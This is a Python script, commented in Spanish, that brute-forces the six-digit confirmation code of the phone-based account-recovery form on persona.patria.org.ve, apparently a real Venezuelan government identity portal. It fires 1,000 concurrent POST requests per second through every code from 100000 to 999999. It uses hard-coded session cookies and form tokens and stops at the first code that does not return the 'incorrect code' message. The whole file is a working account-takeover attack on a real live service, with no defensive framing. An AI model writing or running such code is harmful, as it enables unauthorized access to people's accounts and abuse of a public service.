import requests
import concurrent.futures
import time

# Variable de control para detener el proceso
codigo_correcto_encontrado = False
codigo_correcto = None
combinaciones_probadass = 0  # Contador de combinaciones probadas

# Función para realizar la solicitud POST y verificar si el código fue correcto
def enviar_codigo(confirmation_code):
    global codigo_correcto_encontrado, codigo_correcto, combinaciones_probadass
    url = "https://persona.patria.org.ve/recuperar/acceso/telefono/confirmar"
    
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "es-ES,es;q=0.5",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "referer": "https://persona.patria.org.ve/recuperar/acceso/telefono/confirmar",
        "cookie":"anrcakj.ilit.gt=!NFUlHZulDvh5vh82Rk+o30ir/h5MHcrLvJjiVFK/wih1Jyy8QW+E+tQg584Iym8a1Y3PCAIHsdSiCQ==; _pbid=ccba870e-350c-4f96-21af-f83c6796c7a11729621325851; PHPSESSID=aaa5960d5fa928bc44446d58e4defaa4; TS01547c0e=0169194c1cd3e178ebea6f633ffa456f49e397a78eb04dc2eea03d0ac069f707c425bea5b5719d39bfb8ece052bd3251650d52cf2c"
    }

    # Datos del formulario con el código de confirmación
    data = {
        "form[confirmation_code]": confirmation_code,
        "form[recovery_user_access_by_phone_token]": "a853c35.hvd0W-xqLS5cqmYgBNXRijSa4VrOsXabulysab-tmo4._rVFNr0LSlsPmzBwbJed01H1pGm31T_60C_KG4iA1snFjRYemCtJZW31CQ",
        "form[_token]": "d184383b14296df0a.0KVfu5b9ES_uMKQ_YtcRF542B19fjbPTFa-UfuAChRY.svdn2vi6IWKtScVpO7IodfZwbmo068WhJ8TcRpMvsVi15huD25UiVd1-8Q"
    }

    # Realizar la solicitud POST
    response = requests.post(url, headers=headers, data=data)
    
    # Incrementar el contador de combinaciones probadas
    combinaciones_probadass += 1
    
    if response.status_code == 200:
        if "Código de confirmación incorrecto" in response.text:
            print(f"Código {confirmation_code} incorrecto. Probados {combinaciones_probadass}")
            return confirmation_code, False  # Retornar el código y False
        else:
            # Si el código es correcto, actualizamos la variable de control y el código correcto
            codigo_correcto_encontrado = True
            codigo_correcto = confirmation_code
            print(f"Código {confirmation_code} correcto. Deteniendo el proceso. Probados {combinaciones_probadass}")
            return confirmation_code, True  # Retornar el código y True
    else:
        print(f"Error en la solicitud: {response.status_code}. Probados {combinaciones_probadass}")
        return None, False  # En caso de error, retornar None y False

# Función para realizar 1000 intentos por segundo
def enviar_codigos_concurrente(codigos):
    global codigo_correcto_encontrado
    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        # Enviar los códigos en paralelo
        futures = {executor.submit(enviar_codigo, codigo): codigo for codigo in codigos}
        
        for future in concurrent.futures.as_completed(futures):
            codigo, correcto = future.result()
            if correcto:
                break  # Salir si se encuentra el código correcto

# Función para generar todas las combinaciones de 6 dígitos que no empiezan por 0
def generar_combinaciones():
    combinaciones = []
    for i in range(100000, 1000000):
        combinaciones.append(str(i))
    return combinaciones

# Uso de las funciones
combinaciones = generar_combinaciones()

# Dividimos las combinaciones en bloques de 1000 para cada segundo
bloque = 1000
for i in range(0, len(combinaciones), bloque):
    inicio = time.time()
    enviar_codigos_concurrente(combinaciones[i:i + bloque])
    duracion = time.time() - inicio

    # Asegurar que el bloque de 1000 envíos dure 1 segundo
    if duracion < 1:
        time.sleep(1 - duracion)
    
    # Si ya se encontró el código correcto, detener el proceso
    if codigo_correcto_encontrado:
        break

# Resultado final
print(f"Total de combinaciones probadas: {combinaciones_probadass}")
if codigo_correcto_encontrado:
    print(f"El código correcto es: {codigo_correcto}")
else:
    print("No se encontró ningún código correcto.")